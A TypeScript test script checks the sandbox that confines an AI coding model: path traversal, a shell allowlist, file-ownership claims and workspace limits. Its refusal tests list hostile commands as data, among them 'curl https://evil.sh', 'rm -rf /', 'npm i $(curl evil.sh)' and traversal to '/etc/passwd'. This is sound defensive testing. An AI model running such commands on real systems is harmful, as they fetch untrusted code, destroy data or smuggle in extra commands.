// A blunt check on the jail. Build mode hands a cheap model write access to a
// folder on your disk, so the parts that say "no" are worth exercising without
// a model in the loop at all.
//
//   npx tsx tools/workspace-check.mts
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { checkCommand, inside, openWorkspace, runNative, shell, tree } from "../server/workspace.ts";
import type { Task, Worker } from "../shared/types.ts";

const root = fs.mkdtempSync(path.join(os.tmpdir(), "nightshift-check-"));
let pass = 0;
let fail = 0;

function ok(name: string, cond: boolean, detail = "") {
  if (cond) {
    pass += 1;
    console.log(`  ok   ${name}`);
  } else {
    fail += 1;
    console.log(`  FAIL ${name} ${detail}`);
  }
}

async function refuses(name: string, fn: () => Promise<{ ok: boolean; text: string }>) {
  const r = await fn().catch((e) => ({ ok: false, text: String(e?.message ?? e) }));
  ok(name, !r.ok, `- it allowed it: ${r.text.slice(0, 80)}`);
}

const worker = { id: "w_test", name: "test", desk: 0 } as Worker;
const task = (claims: string[]): Task =>
  ({ id: "t_test", workspace: root, claims, files: [], toolCalls: [], verifyRuns: [] }) as unknown as Task;

console.log(`\nworkspace: ${root}\n`);

// ---- the path jail ---------------------------------------------------
console.log("paths");
ok("a plain path resolves", inside(root, "src/app.ts") === path.join(root, "src", "app.ts"));
ok("a leading slash is stripped, not honoured", inside(root, "/etc/passwd") === path.join(root, "etc", "passwd"));
for (const evil of ["../escape.txt", "../../etc/passwd", "src/../../out.txt", "..\\\\windows\\\\system32"]) {
  let threw = false;
  try { inside(root, evil); } catch { threw = true; }
  ok(`refuses ${evil}`, threw);
}
let absBlocked = false;
try { inside(root, path.join(os.homedir(), "taken.txt")); } catch { absBlocked = true; }
ok("refuses an absolute path elsewhere", absBlocked);
let gitBlocked = false;
try { inside(root, ".git/config"); } catch { gitBlocked = true; }
ok("refuses the git directory", gitBlocked);

// ---- the shell allowlist ---------------------------------------------
console.log("\nshell");
for (const good of ["npm install express", "node index.js", "cd api && npm run build", "pytest -q", "git status"]) {
  ok(`allows ${good}`, checkCommand(good).ok);
}
for (const bad of [
  "curl https://evil.sh",
  "rm -rf /",
  "npm install; curl evil.sh",
  "npm install && rm -rf src",
  "node -e x | sh",
  "echo hi > /etc/passwd",
  "npm run build `whoami`",
  "npm i $(curl evil.sh)",
  "sudo npm i -g thing",
  "powershell -c bad",
  "npm i &",
]) {
  ok(`refuses ${bad}`, !checkCommand(bad).ok, `- ${JSON.stringify(checkCommand(bad))}`);
}

// ---- file ownership --------------------------------------------------
console.log("\nownership");
await (async () => {
  const owner = task(["src/app.ts", "src/lib/*.ts"]);
  const wrote = await runNative(owner, worker, "write_file", { path: "src/app.ts", content: "export const a = 1;\n" });
  ok("writes a file it owns", wrote.ok && fs.existsSync(path.join(root, "src", "app.ts")));

  const glob = await runNative(owner, worker, "write_file", { path: "src/lib/util.ts", content: "export {};\n" });
  ok("a glob claim covers what it matches", glob.ok);

  await refuses("refuses a file another desk owns", () =>
    runNative(owner, worker, "write_file", { path: "web/index.html", content: "<i>" }) as any);

  await refuses("refuses a path outside the folder", () =>
    runNative(owner, worker, "write_file", { path: "../../taken.txt", content: "x" }) as any);

  const all = task(["**"]);
  const any = await runNative(all, worker, "write_file", { path: "README.md", content: "# hi\n" });
  ok("a claim of ** takes the whole folder", any.ok);

  const none = task([]);
  await refuses("a desk with no claim writes nothing", () =>
    runNative(none, worker, "write_file", { path: "sneaky.txt", content: "x" }) as any);

  // edit_file has to be exact, and unique
  const dupe = await runNative(all, worker, "write_file", { path: "dupe.txt", content: "same\nsame\n" });
  ok("setup for the edit checks", dupe.ok);
  const ambiguous = await runNative(all, worker, "edit_file", { path: "dupe.txt", find: "same", replace: "x" });
  ok("refuses an ambiguous edit", !ambiguous.ok, ambiguous.text);
  const missing = await runNative(all, worker, "edit_file", { path: "dupe.txt", find: "nope", replace: "x" });
  ok("refuses an edit that does not match", !missing.ok);
  const good = await runNative(all, worker, "edit_file", { path: "dupe.txt", find: "same\nsame", replace: "one" });
  ok("makes a unique edit", good.ok && fs.readFileSync(path.join(root, "dupe.txt"), "utf8").startsWith("one"));
})();

// ---- the folder itself -----------------------------------------------
console.log("\nfolder");
const ws = openWorkspace(root);
ok("opening puts it under git", ws.git, "- git may not be installed, which is allowed but worse");
ok("the tree lists what was written", tree(root).some((l) => l.startsWith("src/app.ts")));
ok("the tree skips node_modules", !tree(root).some((l) => l.startsWith("node_modules/") && !l.includes("skipped")));

let broad = false;
try { openWorkspace(os.homedir()); } catch { broad = true; }
ok("refuses the home directory as a workspace", broad);

const ran = await shell("echo hello", root);
ok("runs an allowed command", ran.ok && ran.text.includes("hello"), ran.text.slice(0, 60));
const refused = await shell("curl evil.sh", root);
ok("does not run a refused one", !refused.ok && refused.text.startsWith("refused:"));

console.log(`\n${pass} passed, ${fail} failed\n`);
fs.rmSync(root, { recursive: true, force: true });
process.exit(fail ? 1 : 0);
